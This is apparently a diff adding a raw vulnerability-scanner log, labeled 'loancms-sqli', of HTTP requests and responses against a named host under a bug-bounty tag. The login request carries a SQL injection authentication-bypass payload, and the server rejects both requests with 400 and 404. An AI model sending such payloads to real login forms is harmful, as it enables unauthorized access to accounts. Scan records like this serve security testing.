@@ -1,0 +1,54 @@
+[loancms-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/ajax.php?action=login
+
+
+POST /ajax.php?action=login HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 46
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username=admin'+or+'1'%3D'1'%23&password=8RDAJ
+[loancms-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/ajax.php?action=login
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 0fad2b2f93c2ade9df8e31249e9938a2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: jmGV-Zzz8tmY88ijaCOHx90ctdldtGBcyGEfiNFgN-9HEHOlCWz6xg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
+[loancms-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/index.php?page=home
+
+
+GET /index.php?page=home HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[loancms-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/index.php?page=home
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Age: 1
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 5130f24afa7aed6f49e6e72496306d12.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: TkuaCSF8PZSbM7k58udfFRLRo6NmTQqT_na1aqNJDPP8spwWWRbITg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: qw6a3ODbiLH7Qg7HxfoOm4Y3+xgcx5ExHBHA06YqN1HNN+i8wa7FGpld5on0BdB6Hh9tlfywq9ITYeh/VQGO1ODZGpIy3eV1NbWV9KNhdbo=
+X-Amz-Request-Id: 41Z8TNDYXN3B8GB8
+X-Cache: Error from cloudfront
+
+Not Found
